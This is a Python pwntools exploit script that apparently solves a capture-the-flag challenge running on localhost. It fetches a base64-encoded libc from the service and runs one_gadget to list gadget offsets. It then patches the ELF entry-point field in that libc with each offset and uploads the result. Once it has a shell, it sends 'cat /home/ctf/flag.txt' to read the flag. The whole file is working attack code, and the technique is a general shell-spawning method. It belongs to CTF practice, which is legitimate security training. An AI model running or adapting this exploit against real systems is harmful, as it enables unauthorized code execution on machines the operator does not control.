#!/usr/bin/env python3

import base64
import struct
from pwn import *

HOST = 'localhost'
PORT = 50000

io = remote(HOST, PORT)
io.recvuntil(b'libc: ')
libc_b64 = io.recvline()
libc = bytearray(base64.b64decode(libc_b64))
io.close()

with open('libc-2.27.so.tmp', 'wb') as fout:
    fout.write(libc)
one_gadget = process(['one_gadget', '-r', 'libc-2.27.so.tmp'], stderr=None)
offsets = [int(x) for x in one_gadget.recvall().decode().split()]
one_gadget.close()

for offset in offsets:
    log.info('Trying offset %#x', offset)
    io = remote(HOST, PORT)
    io.recvuntil(b'File (base64): ')
    libc[0x18:0x18 + 4] = struct.pack('<I', offset)
    io.sendline(base64.b64encode(libc))
    try:
        io.recvline_contains(b'elf verify')
        io.sendline(b'cat /home/ctf/flag.txt; echo ""; exit')
        flag = io.recvline_regex(b'SSM\\{[^}]*\\}').decode().strip()
        log.info('Flag: %s', flag)
        break
    except Exception as e:
        pass
    io.close()
